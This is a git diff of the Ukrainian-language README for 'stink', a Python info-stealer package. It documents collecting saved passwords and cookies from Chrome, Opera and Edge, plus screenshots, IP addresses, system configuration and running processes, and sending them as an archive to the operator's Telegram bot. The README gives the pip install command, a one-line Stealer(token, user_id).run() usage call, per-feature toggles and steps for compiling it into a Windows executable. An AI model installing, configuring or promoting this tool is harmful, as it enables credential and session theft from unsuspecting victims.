@@ -1,4 +1,8 @@
-[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/)
+<div align="left">
+ <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/FallenAstaroth/stink">
+ <img alt="PyPI - Python Version" src="https://img.shields.io/pypi/pyversions/stink">
+ <img alt="GitHub" src="https://img.shields.io/github/license/FallenAstaroth/stink">
+</div>
 
 # stink
 
@@ -13,6 +17,7 @@
 * [Встановлення](#Встановлення)
 * [Приклад використання](#Приклад-використання)
   * [Стандартний](#Стандартний)
+  * [Додаткові параметри](#Додаткові-параметри)
 * [Налаштування Telegram бота](#Налаштування-Telegram-бота)
   * [Отримання токена](#Отримання-токена)
   * [Отримання айді](#Отримання-айді)
@@ -26,20 +31,22 @@
    - Opera
    - Opera GX
    - Microsoft Edge
-3. Відправлення зібраних даних архівом в Telegram.
-4. Виконання в окремому потоці.
-5. Скріншот екрану.
-6. Збір інформації про систему.
-7. Збір айпі та інше.
+2. Скріншот.
+3. Збір айпі адреси.
+4. Збір конфігурації системи.
+5. Збір активних процесів.
+6. Відправка зібраних даних архівом в Telegram.
+7. Виконання в окремому потоці.
 
 ### Майбутні можливості
 1. Підтримка інших браузерів.
+2. Інші функції.
  
 ## Встановлення
 
 Встановити останню версію можна командою:
 ```
-pip install stink==0.0.8
+pip install stink==0.0.9
 ```
 
 ## Приклад використання
@@ -49,9 +56,27 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
-Для включення виводу помилок додайте параметр `errors=True`.
+### Додаткові параметри
 
-Стандартний ```Stealer``` запускає збір з усіх доступних браузерів і відправляє зібрані дані архівом вам в Telegram.
+- `errors` - виведення помилок.
+
+- `passwords` - збір паролів.
+
+- `cookies` - збір кукі.
+
+- `processes` - збір активних процесів.
+
+- `system` - збір конфігурації системи.
+
+- `screen` - скріншот.
+
+Усі параметри приймають значення `bool`.
+
+- `True` - функція включена.
+
+- `False` - функція виключена.
+
+За замовчуванням увімкнено всі функції, крім виводу помилок.
 
 ## Налаштування Telegram бота
 ### Отримання токена
@@ -121,7 +146,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.8
+pip install stink==0.0.9
 ```
 6. У створеній папці venv переходимо по шляху `\Lib\site-packages\win32\`.
 7. Копіюємо файл `win32crypt.pyd`.
